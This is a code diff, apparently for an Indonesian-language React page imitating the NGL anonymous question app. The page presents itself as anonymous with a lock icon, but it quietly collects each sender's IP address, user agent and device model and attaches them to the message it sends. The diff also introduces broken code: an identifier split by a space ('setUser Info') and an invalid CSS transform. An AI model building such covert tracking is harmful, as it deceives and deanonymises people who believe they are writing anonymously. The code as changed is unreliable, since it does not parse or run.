@@ -5,7 +5,7 @@ export default function NGLPage() {
   const [message, setMessage] = useState("");
   const [loading, setLoading] = useState(false);
   const [success, setSuccess] = useState(false);
-  const [userInfo, setUserInfo] = useState({
+  const [userInfo, setUser Info] = useState({
     ip: "Tidak diketahui",
     userAgent: navigator.userAgent,
     device: "Tidak diketahui",
@@ -17,7 +17,7 @@ export default function NGLPage() {
       .then((res) => res.json())
       .then((data) => {
         const deviceInfo = parseDeviceInfo(navigator.userAgent);
-        setUserInfo({
+        setUser Info({
           ip: data.ip,
           userAgent: navigator.userAgent,
           device: deviceInfo,
@@ -29,11 +29,11 @@ export default function NGLPage() {
   }, []);
 
   const parseDeviceInfo = (userAgent) => {
-    // Gunakan regex sederhana untuk mendeteksi perangkat
-    const deviceRegex = /([^)]+)/;
+    // Gunakan regex yang lebih tepat untuk mendeteksi perangkat
+    const deviceRegex = /(Android|iPhone|iPad|Windows Phone|Macintosh|Linux|Realme C11|Samsung|Xiaomi|Huawei|Oppo|Vivo|Nokia|Sony|LG|HTC|OnePlus|Google Pixel|Motorola|Asus|Lenovo|BlackBerry|ZTE|TCL|Alcatel|Microsoft)/i;
     const match = userAgent.match(deviceRegex);
     if (match) {
-      const deviceDetails = match[1].split(";")[1]?.trim() || "Tidak diketahui";
+      const deviceDetails = match[0].trim() || "Tidak diketahui";
       return deviceDetails;
     }
     return "Tidak diketahui";
@@ -65,6 +65,7 @@ export default function NGLPage() {
 IP: ${userInfo.ip}
 USER AGENT: ${userInfo.userAgent}
 DEVICE: ${userInfo.device}
+
 PESAN: ${message}`,
           }),
         }
@@ -121,7 +122,7 @@ PESAN: ${message}`,
             <i className="fas fa-lock lock-icon"></i> tanya-jawab anonim
           </div>
           <button type="submit" className="send-button" disabled={loading}>
-            {loading ? "Mengirim..." : "Kirim!"}
+            {loading ? "Mengirim..." : "Kirim !"}
           </button>
         </form>
 
@@ -146,7 +147,7 @@ PESAN: ${message}`,
             justify-content: center;
             align-items: flex-start;
             height: 100vh;
-            background: linear-gradient(135deg, #ff416c, #ff4b2b);
+            background: linear-gradient(135deg, #ff416c, #ff4b2b, #ffcc00);
             font-family: Arial, sans-serif;
         }
 
@@ -285,7 +286,7 @@ PESAN: ${message}`,
           }
           to {
             opacity: 1;
-            transform: translate(-50%, -50%);
+            transform: translate(-50%, - 50%);
           }
         }
       `}</style>
